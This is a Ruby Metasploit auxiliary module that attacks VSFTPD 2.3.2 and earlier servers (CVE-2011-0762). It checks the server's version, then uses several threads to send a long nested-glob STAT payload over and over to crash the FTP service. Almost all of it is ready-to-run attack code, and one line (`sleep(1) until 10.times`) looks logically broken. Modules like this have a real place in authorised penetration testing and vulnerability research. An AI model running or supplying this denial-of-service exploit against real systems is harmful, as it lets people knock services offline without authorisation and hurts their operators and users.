##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Ftp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'	=> 'VSFTPD <= 2.3.2 Denial of Service',
        'Description'	=> %q{
          This module triggers a Denial of Service condition in the VSFTPD server in versions before 2.3.3. So far, it has been tested on 2.3.2.
        },
        'Author' => [ 'Nick Cottrell <ncottrellweb[at]gmail.com>', 'Anna Graterol <annagraterol95[at]gmail.com>', 'Mana Mostaani <mana.mostaani[at]gmail.com>' ],
        'License' => MSF_LICENSE,
        'References' => [
          [ 'BID', '46617' ],
          [ 'CVE', '2011-0762' ],
          [ 'EDB', '16270' ]
        ],
        'DisclosureDate' => '2011-02-03',
        'Notes' => {
          'Stability' => [CRASH_SERVICE_DOWN],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => []
        }
      )
    )

    register_advanced_options(
      [
        OptInt.new('TestThreads', [ true, 'Number of test threads', 5])
      ]
    )
  end

  def check
    # attempt to connect
    begin
      if !connect_login
        print_error('Connection refused.')
        return Exploit::CheckCode::Unknown
      end
    rescue Rex::ConnectionRefused
      print_error('Connection refused.')
      return Exploit::CheckCode::Unknown
    rescue Rex::ConnectionTimeout
      print_error('Connection timed out')
      return Exploit::CheckCode::Unknown
    end
    s = ''
    loop do
      # get each line until our desired line shows or end line shows
      s = send_cmd(['STAT'], true)
      break if (s =~ /vsFTPd \d+\.\d+\.\d+/) || (s == "211 End of status\r\n")
    end
    disconnect
    # check if version was found
    if s !~ /vsFTPd \d+\.\d+\.\d+/
      print_error('Did not find ftp version in FTP session.')
      return Exploit::CheckCode::Unknown
    end

    # pull out version and check if its in range of vulnerability
    version = s[/\d+\.\d+\.\d+/]
    if Rex::Version.new(version) < Rex::Version.new('2.3.3')
      Exploit::CheckCode::Appears
    else
      Exploit::CheckCode::Safe
    end
  end

  def run
    fail_with(Failure::NotVulnerable, 'Target is not vulnerable.') if check != Exploit::CheckCode::Appears

    payload = 'STAT {{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{{*},{.}}}]}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}]}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}]}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}]}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}]}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}]}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}'

    vprint_status("Payload being sent: #{payload}")

    threads = []
    datastore['TestThreads'].times do
      threads << Thread.new do
        # Connect to ftp port
        ftp = connect_ftp(datastore['RHOSTS'], datastore['RPORT'], datastore['FTPUSER'], datastore['FTPPASS'])

        loop do
          print_status('sending payload')
          10.times do
            ftp.send_cmd([payload.to_s], false)
          end
          ftp.send_cmd([payload.to_s], true)
        rescue Rex::ConnectionTimeout
          print_error('Connection timeout! Sending again')
        rescue Errno::ECONNRESET
          print_error('Connection reset!')
        rescue Rex::ConnectionRefused
          print_good('Connection refused! Appears DOS attack succeeded.')
        end
        ftp.disconnect
      end
    end
    sleep(1) until 10.times

    # Stop the threads
    threads.each(&:kill)
    threads.each(&:join)
    print_status('DDOS ended.')
  end

  def connect_ftp(host, port, user, pass)
    ftp = Rex::Proto::FTP::Client.new(host, port, true)
    ftp.connect

    # Log in to the FTP server
    ftp.login(user, pass)

    # Set passive mode
    ftp.passive = true

    ftp
  end
end
